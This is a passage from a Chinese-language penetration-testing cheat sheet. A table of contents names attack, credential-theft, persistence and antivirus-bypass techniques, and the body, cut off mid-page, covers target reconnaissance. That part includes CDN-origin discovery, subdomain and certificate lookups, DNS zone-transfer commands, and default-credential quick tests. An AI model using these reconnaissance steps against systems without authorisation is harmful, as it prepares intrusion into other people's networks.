<li><a href="#%E6%94%BB%E5%87%BBmysql%E6%95%B0%E6%8D%AE%E5%BA%93">攻击MySQL数据库</a></li>
<li><a href="#%E6%94%BB%E5%87%BBmssql%E6%95%B0%E6%8D%AE%E5%BA%93">攻击MSSQL数据库</a></li>
<li><a href="#%E9%9A%94%E7%A6%BB%E4%B8%BB%E6%9C%BApayload">隔离主机payload</a></li>
<li><a href="#%E7%88%86%E7%A0%B4">爆破</a><ul>
<li><a href="#hydra">Hydra</a></li>
<li><a href="#medusa">Medusa</a></li>
<li><a href="#%E5%9F%9F%E5%86%85%E7%88%86%E7%A0%B4">域内爆破</a><ul>
<li><a href="#kerbrute">Kerbrute</a></li>
<li><a href="#domainpasswordspray">DomainPasswordSpray</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%96%B9%E7%A8%8B%E5%BC%8F%E5%86%85%E7%BD%91%E4%B8%8D%E4%BA%A7%E7%94%9Fsession">方程式内网不产生session</a></li>
<li><a href="#kerberoasting">Kerberoasting</a><ul>
<li><a href="#spn%E5%8F%91%E7%8E%B0">SPN发现</a><ul>
<li><a href="#cmd">cmd</a></li>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#empire">Empire</a></li>
</ul>
</li>
<li><a href="#%E7%94%B3%E8%AF%B7%E7%A5%A8%E6%8D%AE">申请票据</a></li>
<li><a href="#%E5%AF%BC%E5%87%BA%E7%A5%A8%E6%8D%AE">导出票据</a></li>
<li><a href="#%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81">破解密码</a></li>
<li><a href="#%E9%87%8D%E5%86%99%E7%A5%A8%E6%8D%AE">重写票据</a></li>
<li><a href="#getuserspns">GetUserSPNs</a></li>
</ul>
</li>
<li><a href="#aseproasting">ASEPRoasting</a></li>
<li><a href="#pass-the-hash">PASS-THE-HASH</a><ul>
<li><a href="#wmiexec--thehash">WMIExec &amp; TheHash</a></li>
<li><a href="#wmi">WMI</a><ul>
<li><a href="#wmiexecpy">wmiexec.py</a></li>
<li><a href="#wmiexecvbs">wmiexec.vbs</a></li>
<li><a href="#powershell">Powershell</a></li>
</ul>
</li>
<li><a href="#psexec">Psexec</a></li>
<li><a href="#mimikatz">Mimikatz</a></li>
<li><a href="#pth-winexe">pth-winexe</a></li>
<li><a href="#smbexec">Smbexec</a></li>
</ul>
</li>
<li><a href="#pass-the-ticket">PASS-THE-TICKET</a><ul>
<li><a href="#%E5%90%8D%E8%AF%8D">名词</a></li>
<li><a href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AEmimikatz">黄金票据+Mimikatz</a></li>
<li><a href="#%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AEmimikatz">白银票据+Mimikatz</a></li>
<li><a href="#ms14-068">MS14-068</a></li>
<li><a href="#mimikatzmsf">Mimikatz+MSF</a></li>
<li><a href="#goldenpacpy">goldenPac.py</a></li>
</ul>
</li>
<li><a href="#%E8%B4%A6%E6%88%B7%E5%A7%94%E6%B4%BE">账户委派</a><ul>
<li><a href="#%E8%B4%A6%E6%88%B7%E9%9D%9E%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">账户非受限委派</a></li>
<li><a href="#%E8%B4%A6%E6%88%B7%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">账户受限委派</a></li>
</ul>
</li>
<li><a href="#%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">资源受限委派</a></li>
<li><a href="#cve-2019-0708">CVE-2019-0708</a></li>
<li><a href="#ntlm%E4%B8%AD%E7%BB%A7">NTLM中继</a><ul>
<li><a href="#ntlmrelayx%E8%B5%84%E6%BA%90%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE">Ntlmrelayx+资源受限委派</a></li>
<li><a href="#responder">Responder</a><ul>
<li><a href="#smb%E5%8D%8F%E8%AE%AE%E6%88%AA%E8%8E%B7">SMB协议截获</a></li>
<li><a href="#wpad%E4%BB%A3%E7%90%86%E6%AC%BA%E9%AA%97">WPAD代理欺骗</a></li>
<li><a href="#web%E6%BC%8F%E6%B4%9E">Web漏洞</a></li>
<li><a href="#%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB">中继攻击</a></li>
<li><a href="#ntlmv2hash%E7%A0%B4%E8%A7%A3">NTLMv2Hash破解</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#gpp-password">GPP-Password</a></li>
<li><a href="#winrm%E6%97%A0%E6%96%87%E4%BB%B6%E6%89%A7%E8%A1%8C">WinRM无文件执行</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E5%9F%9F%E7%AE%A1%E5%91%BD%E4%BB%A4">添加域管命令</a></li>
<li><a href="#ssh%E5%AF%86%E9%92%A5%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95">SSH密钥免密登录</a></li>
<li><a href="#%E8%8E%B7%E5%8F%96%E4%BF%9D%E5%AD%98%E7%9A%84rdp%E5%AF%86%E7%A0%81">获取保存的RDP密码</a></li>
</ul>
</li>
<li><a href="#%E5%90%8E%E9%97%A8%E6%8C%81%E4%B9%85%E5%8C%96">后门&amp;持久化</a><ul>
<li><a href="#%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7">影子用户</a></li>
<li><a href="#rid%E5%8A%AB%E6%8C%81">RID劫持</a></li>
<li><a href="#guest%E6%BF%80%E6%B4%BB">Guest激活</a></li>
<li><a href="#%E6%98%A0%E5%83%8F%E5%8A%AB%E6%8C%81">映像劫持</a><ul>
<li><a href="#sethc">Sethc</a></li>
<li><a href="#%E8%BD%BB%E6%9D%BE%E4%BD%BF%E7%94%A8">轻松使用</a></li>
<li><a href="#ifeo%E9%9D%99%E9%BB%98%E6%89%A7%E8%A1%8C">IFEO静默执行</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%90%AF%E5%8A%A8%E9%A1%B9">注册表启动项</a><ul>
<li><a href="#msf">MSF</a></li>
<li><a href="#cmd">CMD</a></li>
</ul>
</li>
<li><a href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">计划任务</a><ul>
<li><a href="#%E5%8A%A0%E8%BD%BDpowershell">加载powershell</a></li>
<li><a href="#%E6%89%A7%E8%A1%8Cexe">执行exe</a></li>
</ul>
</li>
<li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5">进程注入</a><ul>
<li><a href="#appcertdlls">AppCertDlls</a></li>
<li><a href="#appinit_dlls">AppInit_DLLs</a></li>
<li><a href="#msf">MSF</a></li>
</ul>
</li>
<li><a href="#%E7%99%BB%E5%BD%95%E5%88%9D%E5%A7%8B%E5%8C%96">登录初始化</a><ul>
<li><a href="#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4%E7%A8%8B%E5%BA%8F">屏幕保护程序</a></li>
</ul>
</li>
<li><a href="#mof">MOF</a></li>
<li><a href="#winrm%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8">WinRM端口复用</a></li>
<li><a href="#%E5%88%9B%E5%BB%BA%E6%9C%8D%E5%8A%A1">创建服务</a></li>
<li><a href="#bitadmin">Bitadmin</a></li>
<li><a href="#clr-injection">CLR Injection</a></li>
<li><a href="#com-object-hijacking">COM OBJECT hijacking</a><ul>
<li><a href="#caccpropservicesclass-and-mmdeviceenumerato">CAccPropServicesClass and MMDeviceEnumerato</a></li>
<li><a href="#explorer">Explorer</a></li>
</ul>
</li>
<li><a href="#squibledoo">Squibledoo</a></li>
<li><a href="#dll%E5%8A%AB%E6%8C%81">DLL劫持</a><ul>
<li><a href="#%E5%8A%AB%E6%8C%811">劫持1</a></li>
<li><a href="#%E5%8A%AB%E6%8C%812">劫持2</a></li>
<li><a href="#msdtc%E6%9C%8D%E5%8A%A1%E5%8A%AB%E6%8C%81">MSDTC服务劫持</a></li>
<li><a href="#rattler">Rattler</a></li>
</ul>
</li>
<li><a href="#dll%E4%BB%A3%E7%90%86%E5%8A%AB%E6%8C%81%E5%8F%B3%E9%94%AE">DLL代理劫持右键</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8amsi%E6%89%AB%E6%8F%8F%E6%8E%A5%E5%8F%A3%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90">使用AMSI扫描接口维持权限</a></li>
<li><a href="#dll%E5%8A%AB%E6%8C%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1">DLL劫持计划任务</a></li>
<li><a href="#dll%E6%B3%A8%E5%85%A5">DLL注入</a><ul>
<li><a href="#powershell">Powershell</a></li>
<li><a href="#injectproc">InjectProc</a></li>
</ul>
</li>
<li><a href="#%E9%80%9A%E8%BF%87%E6%8E%A7%E5%88%B6%E9%9D%A2%E6%9D%BF%E5%8A%A0%E8%BD%BD%E9%A1%B9%E7%BB%B4%E6%8C%81%E6%9D%83%E9%99%90">通过控制面板加载项维持权限</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E8%87%AA%E5%AE%9A%E4%B9%89net%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E8%BF%9B%E8%A1%8CDLL%E6%B3%A8%E5%85%A5">通过自定义.net垃圾回收机制进行DLL注入</a></li>
<li><a href="#windows-fax-dll-injection">Windows FAX DLL Injection</a></li>
<li><a href="#dsrm%E6%B3%A8%E5%86%8C%E8%A1%A8acl%E5%90%8E%E9%97%A8">DSRM+注册表ACL后门</a></li>
<li><a href="#dcshadowsid-history">DCShadow&amp;SID History</a></li>
<li><a href="#dcsync%E5%90%8E%E9%97%A8">DCSync后门</a></li>
<li><a href="#netsh-helper-dll">Netsh Helper DLL</a><ul>
<li><a href="#msfvenom%E7%94%9F%E6%88%90dll">MSFvenom生成DLL</a></li>
<li><a href="#msfweb_delivery">MSF+web_delivery</a></li>
<li><a href="#msfshellcode">MSF&amp;Shellcode</a></li>
</ul>
</li>
<li><a href="#mssql%E5%90%8E%E9%97%A8">MSSQL后门</a></li>
<li><a href="#nssm">NSSM</a></li>
<li><a href="#%E6%B7%BB%E5%8A%A0%E7%AD%BE%E5%90%8D">添加签名</a></li>
<li><a href="#metsvc">Metsvc</a></li>
<li><a href="#persistence">Persistence</a></li>
<li><a href="#hookpasswordchangenotify">HookPasswordChangeNotify</a></li>
<li><a href="#nppspy%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81">NPPSpy记录密码</a></li>
<li><a href="#password-filter-dll">Password Filter DLL</a></li>
<li><a href="#wmic%E4%BA%8B%E4%BB%B6%E8%AE%A2%E9%98%85">WMIC事件订阅</a></li>
<li><a href="#wmi-persistence">WMI-Persistence</a></li>
<li><a href="#invoke-tasksbackdoor">Invoke-Tasksbackdoor</a></li>
<li><a href="#invoke-adsbackdoor">Invoke-ADSBackdoor</a></li>
<li><a href="#ads%E9%9A%90%E8%97%8Fwebshell">ADS隐藏webshell</a></li>
<li><a href="#adsjavascript">ADS&amp;JavaScript</a></li>
<li><a href="#empire">Empire</a><ul>
<li><a href="#lnk%E5%90%8E%E9%97%A8">LNK后门</a></li>
<li><a href="#wmi">WMI</a></li>
</ul>
</li>
<li><a href="#%E6%B3%A8%E5%85%A5ssp%E8%A2%AB%E5%8A%A8%E6%94%B6%E9%9B%86%E5%AF%86%E7%A0%81">注入SSP被动收集密码</a><ul>
<li><a href="#mimikatz">Mimikatz</a></li>
<li><a href="#empire">Empire</a></li>
<li><a href="#powersploit">Powersploit</a></li>
</ul>
</li>
<li><a href="#%E5%9F%BA%E4%BA%8E%E5%9F%9F%E7%AD%96%E7%95%A5%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90%E5%90%8E%E9%97%A8">基于域策略文件权限后门</a></li>
<li><a href="#kerberoasting%E5%90%8E%E9%97%A8">Kerberoasting后门</a></li>
<li><a href="#s4u2self%E5%90%8E%E9%97%A8">S4U2Self后门</a></li>
<li><a href="#%E5%8F%97%E9%99%90%E5%A7%94%E6%B4%BE%E5%90%8E%E9%97%A8">受限委派后门</a></li>
<li><a href="#skeleton-key%E4%B8%87%E8%83%BD%E9%92%A5%E5%8C%99">Skeleton Key万能钥匙</a></li>
<li><a href="#%E5%94%AF%E4%B8%80ip%E8%AE%BF%E9%97%AE">唯一IP访问</a></li>
<li><a href="#linux-cron%E5%90%8E%E9%97%A8">Linux cron后门</a></li>
<li><a href="#strace%E8%AE%B0%E5%BD%95ssh%E5%AF%86%E7%A0%81">Strace记录ssh密码</a></li>
<li><a href="#sshd%E5%90%8E%E9%97%A8">SSHD后门</a></li>
<li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5">进程注入</a></li>
<li><a href="#ssh-wrapper%E5%90%8E%E9%97%A8">SSH wrapper后门</a></li>
<li><a href="#suid-shell">SUID Shell</a></li>
<li><a href="#ssh%E5%85%AC%E7%A7%81%E9%92%A5%E7%99%BB%E5%BD%95">SSH公私钥登录</a></li>
<li><a href="#reptile">Reptile</a></li>
<li><a href="#kbeast_rootkit">Kbeast_rootkit</a></li>
<li><a href="#openssh%E5%90%8E%E9%97%A8">OpenSSH后门</a></li>
<li><a href="#iptables%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8">IPTables端口复用</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86">文件处理</a></li>
<li><a href="#iis_bin_backdoor">IIS_Bin_Backdoor</a></li>
<li><a href="#iis_netdll_spy">IIS_NETDLL_Spy</a></li>
<li><a href="#iis_raid">IIS_RAID</a></li>
<li><a href="#java-web-backdoor">JAVA Web Backdoor</a></li>
<li><a href="#tomcat-jsp-hideshell">Tomcat JSP HideShell</a></li>
<li><a href="#apache-module%E5%90%8E%E9%97%A81">Apache Module后门1</a></li>
<li><a href="#apache-module%E5%90%8E%E9%97%A82">Apache Module后门2</a></li>
<li><a href="#apache-module%E5%90%8E%E9%97%A83">Apache Module后门3</a></li>
<li><a href="#nginx-lua%E5%90%8E%E9%97%A8">Nginx Lua后门</a></li>
<li><a href="#pwnnginx">PwnNginx</a></li>
</ul>
</li>
</ul>
</li>
<li><p><a href="#%E6%B8%97%E9%80%8F%E5%92%8C%E7%BA%A2%E9%98%9Ftips">渗透和红队tips</a></p>
<ul>
<li><a href="#%E7%88%B6%E8%BF%9B%E7%A8%8B%E7%A0%B4%E5%9D%8F">父进程破坏</a></li>
<li><a href="#lot%E9%AB%98%E9%A2%91%E7%8E%87%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81">loT高频率账户密码</a></li>
<li><a href="#bypass-mod_security">Bypass mod_security</a></li>
<li><a href="#%E6%9F%A5%E6%89%BEgit%E5%92%8Csvn%E7%9A%84%E5%AD%97%E5%85%B8">查找git和svn的字典</a></li>
<li><a href="#top-25-%E9%87%8D%E5%AE%9A%E5%90%91dorks">Top 25 重定向dorks</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8grep%E5%BF%AB%E9%80%9F%E5%8E%BB%E9%99%A4%E5%9E%83%E5%9C%BE%E6%95%B0%E6%8D%AE">使用grep快速去除垃圾数据</a></li>
<li><a href="#%E5%B7%B2%E6%B3%84%E9%9C%B2%E7%9A%84%E5%AF%86%E7%A0%81%E6%95%B4%E7%90%86%E5%87%BA%E7%9A%84%E5%AD%97%E5%85%B8">已泄露的密码整理出的字典</a></li>
<li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5bypass">命令注入Bypass</a></li>
<li><a href="#%E6%9F%A5%E8%AF%A2%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8heartbleed%E6%BC%8F%E6%B4%9E">查询是否存在heartbleed漏洞</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E8%A7%A3%E5%8E%8B%E6%96%87%E4%BB%B6">远程解压文件</a></li>
<li><a href="#top25-ssrf-dorks">Top25 ssrf dorks</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8securitytrails-api%E6%9F%A5%E8%AF%A2%E5%AD%90%E5%9F%9F%E5%90%8D">使用SecurityTrails API查询子域名</a></li>
<li><a href="#%E9%82%AE%E4%BB%B6%E5%9C%B0%E5%9D%80payload">邮件地址payload</a></li>
<li><a href="#web-server%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E5%91%BD%E4%BB%A4">Web server日志分析命令</a></li>
<li><a href="#bypass-amsi">Bypass AMSI</a></li>
<li><a href="#bypass-amsi-2">Bypass AMSI 2</a></li>
<li><a href="#cve-2020-5902">CVE-2020-5902</a></li>
<li><a href="#%E4%B8%80%E4%BA%9B%E5%8F%AF%E5%B0%9D%E8%AF%95%E7%BB%95%E8%BF%87%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E6%89%A7%E8%A1%8C">一些可尝试绕过白名单的执行</a></li>
<li><a href="#%E7%BB%95%E8%BF%87lsa-protection">绕过lsa protection</a></li>
<li><a href="#pezor%E5%85%8D%E6%9D%80">Pezor免杀</a></li>
<li><a href="#%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E9%80%BB%E8%BE%91">动态调用进程注入逻辑</a></li>
<li><a href="#%E5%9C%A8windows-server-2016%E5%92%8C2019%E4%B8%AD%E7%BB%95%E8%BF%87windows-defender">在Windows Server 2016和2019中绕过Windows Defender</a></li>
<li><a href="#%E5%86%85%E5%AD%98%E4%B8%AD%E8%A7%A3%E7%A0%81shellcode%E7%BB%95%E8%BF%87av">内存中解码shellcode绕过av</a></li>
<li><a href="#cshot-shellcode%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E5%99%A8">cshot shellcode远程加载器</a></li>
<li><a href="#thinkphp%E6%B8%97%E9%80%8F%E6%89%8B%E6%AE%B5">thinkphp渗透手段</a></li>
<li><a href="#%E4%BD%BF%E7%94%A8windows-defender%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6">使用windows defender下载文件</a></li>
<li><a href="#powershell%E8%84%9A%E6%9C%AC%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87amsi%E5%92%8Cav">Powershell脚本混淆绕过amsi和av</a></li>
<li><a href="#%E9%80%9A%E8%BF%87%E6%8C%82%E8%B5%B7eventLog%E6%9C%8D%E5%8A%A1%E7%BA%BF%E7%A8%8B%E7%A6%81%E7%94%A8windows%E4%BA%8B%E4%BB%B6%E6%97%A5%E5%BF%97">通过挂起EventLog服务线程禁用Windows事件日志</a></li>
<li><a href="#dedecms">dedecms</a></li>
<li><a href="#dedecms%E5%89%8D%E5%8F%B0%E9%87%8D%E7%BD%AE%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81">dedecms前台重置任意管理员密码</a></li>
<li><a href="#shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Shiro rememberMe反序列化漏洞</a></li>
<li><a href="#shiro-padding-oracle-attack">Shiro Padding Oracle Attack</a></li>
<li><a href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87">shiro权限绕过</a></li>
<li><a href="#%E7%BC%96%E8%BE%91%E5%99%A8%E6%BC%8F%E6%B4%9E">编辑器漏洞</a></li>
<li><a href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEphpmyadmin">宝塔面板未授权访问phpmyadmin</a></li>
<li><a href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D">深信服</a></li>
<li><a href="#%E4%BB%8Elfi%E5%88%B0rce">从LFI到RCE</a></li>
<li><a href="#%E9%9A%90%E8%97%8Fwindows%E6%9C%8D%E5%8A%A1">隐藏windows服务</a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2>站点注册人注册过的其他网站(对注册人、邮箱、电话的反查)，对查到的站点的深入<h2 id="网站IP"><a href="#网站IP" class="headerlink" title="网站IP"></a>网站IP</h2><h3 id="是否存在CDN"><a href="#是否存在CDN" class="headerlink" title="是否存在CDN"></a>是否存在CDN</h3>Ping、多地ping、国外ping<h3 id="Bypass-cdn常规方式"><a href="#Bypass-cdn常规方式" class="headerlink" title="Bypass cdn常规方式"></a>Bypass cdn常规方式</h3>子域名<br><a class="link" href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/<i class="fas fa-external-link-alt"></i></a><br>Ping根域名<br>Nslookup<br>Cloudflare的真实IP寻找<br><a class="link" href="http://crimeflare.org:82/cfs.html">http://crimeflare.org:82/cfs.html<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py">https://github.com/gwen001/pentest-tools/blob/master/cloudflare-origin-ip.py<i class="fas fa-external-link-alt"></i></a><br>查找老域名<br>查找关联域名<br><a class="link" href="http://www.baidu.com/">www.baidu.com<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://www.baidu.cn/">www.baidu.cn<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://www.baidu.org/">www.baidu.org<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://www.baidu.xyz等等/">www.baidu.xyz等等<i class="fas fa-external-link-alt"></i></a><br>信息泄露/配置文件<br>Phpinfo<br>网页源码<br>Svn<br>Github<br>Shodan/fofa/zoomeye<br>SSL证书记录<br><a class="link" href="https://censys.io/">https://censys.io/<i class="fas fa-external-link-alt"></i></a><br>网站漏洞<br>Xss<br>Ssrf<br>命令执行<br>SQL注入(某种情况loadfile读取linux的ip配置文件，hosts文件等)<br>DNS记录，证书记录<br>设置xff/x-remote-ip/x-remote-addr为127.0.0.1/或ipv6地址<br>RSS订阅/邮件头<br>APP反编译搜索/截取APP的请求信息<br>修改hosts文件指向<h2 id="域名历史IP"><a href="#域名历史IP" class="headerlink" title="域名历史IP"></a>域名历史IP</h2><a class="link" href="https://x.threatbook.cn/">https://x.threatbook.cn/<i class="fas fa-external-link-alt"></i></a><h2 id="网站架构-服务器指纹-CMS识别-容器"><a href="#网站架构-服务器指纹-CMS识别-容器" class="headerlink" title="网站架构/服务器指纹/CMS识别/容器"></a>网站架构/服务器指纹/CMS识别/容器</h2>Whatweb<br>网页源代码<br>请求头/响应头<br>网站底部，顶部，左上角右上角<br>网站报错信息<br><a class="link" href="http://www.yunsee.cn/">http://www.yunsee.cn/<i class="fas fa-external-link-alt"></i></a><br>域名/install<br>Firefox插件Wappalyzer<br>CMS漏洞<br>定位版本对应已知漏洞检查<br>CMS未知漏洞挖掘<br>Web容器已知漏洞(解析漏洞这种)<br>显示网站使用的技术<br><a class="link" href="https://builtwith.com/">https://builtwith.com/<i class="fas fa-external-link-alt"></i></a><br>中间件、组件<br>Weblogic、tomcat、zabbix、struts、axis等<br><a class="link" href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness<i class="fas fa-external-link-alt"></i></a><h2 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h2>老站、同样架构或同源码的子站<br>爆破，接口查询<br><a class="link" href="https://phpinfo.me/domain/">https://phpinfo.me/domain/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://d.chinacycc.com/index.php?m=Login&amp;a=index">https://d.chinacycc.com/index.php?m=Login&amp;a=index<i class="fas fa-external-link-alt"></i></a><br>subDomainBrute、knockpy<br>OWA发现、dig adfs、dig mail<br><a class="link" href="https://dns.bufferover.run/dns?q=baidu.com">https://dns.bufferover.run/dns?q=baidu.com<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://api.hackertarget.com/reversedns/?q=target.com">http://api.hackertarget.com/reversedns/?q=target.com<i class="fas fa-external-link-alt"></i></a><h2 id="网站使用的CMS的官方demo站"><a href="#网站使用的CMS的官方demo站" class="headerlink" title="网站使用的CMS的官方demo站"></a>网站使用的CMS的官方demo站</h2>找不到demo就找源码开发者，加群什么的，结合社会工程学要个后台截图(对于一些后台目录复杂的cms)，注意看网站上一些功能介绍的截图。<h2 id="SSL证书信息"><a href="#SSL证书信息" class="headerlink" title="SSL证书信息"></a>SSL证书信息</h2><a class="link" href="https://crt.sh/?q=%25.target.com">https://crt.sh/?q=%25.target.com<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://censys.io/certificates?q=target.com">https://censys.io/certificates?q=target.com<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/cheetz/sslScrape">https://github.com/cheetz/sslScrape<i class="fas fa-external-link-alt"></i></a><h2 id="DNS历史解析记录"><a href="#DNS历史解析记录" class="headerlink" title="DNS历史解析记录"></a>DNS历史解析记录</h2><a class="link" href="https://dnsdumpster.com/">https://dnsdumpster.com/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://censys.io/">https://censys.io/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://securitytrails.com/">https://securitytrails.com/<i class="fas fa-external-link-alt"></i></a><br>域传送漏洞检查<br>Dnsenum、fierce<br><a class="link" href="http://ha.ckers.org/fierce/">http://ha.ckers.org/fierce/<i class="fas fa-external-link-alt"></i></a><br>$ ./fierce.pl -dns example.com<br>$ ./fierce.pl –dns example.com –wordlist myWordList.txt<blockquote>
<p>dig @ns.example.com example=.com AXFR<br>nslookup -type=ns xxx.yyy.cn #查询解析某域名的DNS服务器<br>nslookup #进入nslookup交互模式<br>server dns.domian.com #指定dns服务器<br>ls xxx.yyy.cn #列出域信息</p>
</blockquote>
<h2 id="同服站点情况"><a href="#同服站点情况" class="headerlink" title="同服站点情况"></a>同服站点情况</h2><a class="link" href="https://site.ip138.com/">https://site.ip138.com/<i class="fas fa-external-link-alt"></i></a><br>火狐插件flagfox,配置单击指向bing查ip对应的域名<h2 id="同样架构或源码的站"><a href="#同样架构或源码的站" class="headerlink" title="同样架构或源码的站"></a>同样架构或源码的站</h2><h2 id="网站js"><a href="#网站js" class="headerlink" title="网站js"></a>网站js</h2><a class="link" href="https://github.com/003random/getJS">https://github.com/003random/getJS<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder<i class="fas fa-external-link-alt"></i></a><br>或浏览器F12也可以看到加载的<br>敏感信息、可能存在漏洞的参数等信息<br>查看网页源代码，注释的一些信息，比如没有删掉的接口、前台没有的页面、越权、注入、js等<h2 id="网站使用的第三方js"><a href="#网站使用的第三方js" class="headerlink" title="网站使用的第三方js"></a>网站使用的第三方js</h2><h2 id="云信息"><a href="#云信息" class="headerlink" title="云信息"></a>云信息</h2>Aliyun、AWS、GCP、Azure等<br>查找可公开访问的实例<br><a class="link" href="https://github.com/gwen001/s3-buckets-finder">https://github.com/gwen001/s3-buckets-finder<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/nccgroup/aws-inventory">https://github.com/nccgroup/aws-inventory<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/jordanpotti/AWSBucketDump">https://github.com/jordanpotti/AWSBucketDump<i class="fas fa-external-link-alt"></i></a><h2 id="APP反编译"><a href="#APP反编译" class="headerlink" title="APP反编译"></a>APP反编译</h2>url、js、osskey、api等信息查找<br>搜集到接口该怎么做<br>Fuzz常见参数<h2 id="C段-B段信息"><a href="#C段-B段信息" class="headerlink" title="C段/B段信息"></a>C段/B段信息</h2>Banner、是否存在目标的后台或其他入口/其他业务系统<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2>recon-ng,theharvester,maltego,exiftool等<br><a class="link" href="https://www.spiderfoot.net/">https://www.spiderfoot.net/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="https://github.com/smicallef/spiderfoot">https://github.com/smicallef/spiderfoot<i class="fas fa-external-link-alt"></i></a><h2 id="端口对外开放情况"><a href="#端口对外开放情况" class="headerlink" title="端口对外开放情况"></a>端口对外开放情况</h2>Masscan、scanport等<br>针对常见的那些端口的利用的常规方法<br>常见的未授权访问的服务如redis，mongodb等<h2 id="目录扫描-爬虫-慎用"><a href="#目录扫描-爬虫-慎用" class="headerlink" title="目录扫描/爬虫(慎用)"></a>目录扫描/爬虫(慎用)</h2><h2 id="WAF情况识别"><a href="#WAF情况识别" class="headerlink" title="WAF情况识别"></a>WAF情况识别</h2><a class="link" href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f<i class="fas fa-external-link-alt"></i></a><br>做好绕过策略的计划<h2 id="随手测试"><a href="#随手测试" class="headerlink" title="随手测试"></a>随手测试</h2>单引号<br>xx.jpg/.php<br>admin/123456<br>万能密码<br>Heartbleed漏洞<h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2>Google自定义搜索引擎整合的300多个社交网站<br><a class="link" href="https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22">https://cse.google.com/cse?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:iyxger-cwug&amp;q=%22%22<i class="fas fa-external-link-alt"></i></a><br>Google自定义搜索引擎整合的文件共享网站<br><a class="link" href="https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22">https://cse.google.com/cse/publicurl?key=AIzaSyB2lwQuNzUsRTH-49FA7od4dB_Xvu5DCvg&amp;cx=001794496531944888666:hn5bcrszfhe&amp;q=%22%22<i class="fas 